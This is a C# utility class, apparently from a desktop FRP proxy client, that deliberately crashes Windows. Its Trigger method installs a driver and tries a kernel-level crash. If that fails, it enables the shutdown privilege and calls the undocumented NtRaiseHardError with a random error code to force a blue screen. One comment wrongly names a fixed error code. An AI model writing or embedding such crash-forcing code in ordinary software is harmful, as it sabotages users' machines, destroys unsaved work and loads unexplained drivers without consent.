using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace LoCyanFrpDesktop.Utils
{
    class BSODTrigger
    {
        
        private static List<uint> UsermodeErrorCodes = new List<uint>
        {
            0xC0000005, // STATUS_ACCESS_VIOLATION
            0xC0000017, // STATUS_NO_MEMORY
            0xC0000022, // STATUS_ACCESS_DENIED
            0xC000009A, // STATUS_INSUFFICIENT_RESOURCES
            0xC000009C, // STATUS_DEVICE_DATA_ERROR
            0xC000009D, // STATUS_DEVICE_NOT_CONNECTED
            0xC00000BB, // STATUS_UNEXPECTED_IO_ERROR
            0xC0000185, // STATUS_IO_DEVICE_ERROR
            0xC0000221, // STATUS_IMAGE_CHECKSUM_MISMATCH
            0xC000026C, // STATUS_DRIVER_ENTRYPOINT_NOT_FOUND
            0xC000026E, // STATUS_DRIVER_ORDINAL_NOT_FOUND
            0xC0000350, // STATUS_INSUFFICIENT_LOGON_INFO
            0xC0000428, // STATUS_INVALID_IMAGE_HASH
            0xC0000703, // STATUS_REMOTE_PROTOCOL_MISMATCH
        };

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtRaiseHardError(
            uint ErrorStatus,
            uint NumberOfParameters,
            IntPtr UnicodeStringParameterMask,
            IntPtr Parameters,
            uint ResponseOption,
            out uint Response);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlAdjustPrivilege(
            int Privilege,
            bool Enable,
            bool CurrentThread,
            out bool Enabled);

        public static void Trigger()
        {
            DriverInstaller.Installer();
            var a = KernelBSODTrigger.Trigger();
            if (!a)
            {
                bool enabled;
                RtlAdjustPrivilege(19, true, false, out enabled); // Adjust privilege to SE_SHUTDOWN_PRIVILEGE

                uint response;
                NtRaiseHardError(UsermodeErrorCodes[Random.Shared.Next(0, UsermodeErrorCodes.Count)], 0, IntPtr.Zero, IntPtr.Zero, 6, out response); // 0xC0000022 is STATUS_ACCESS_DENIED
            }


        }
    }

}
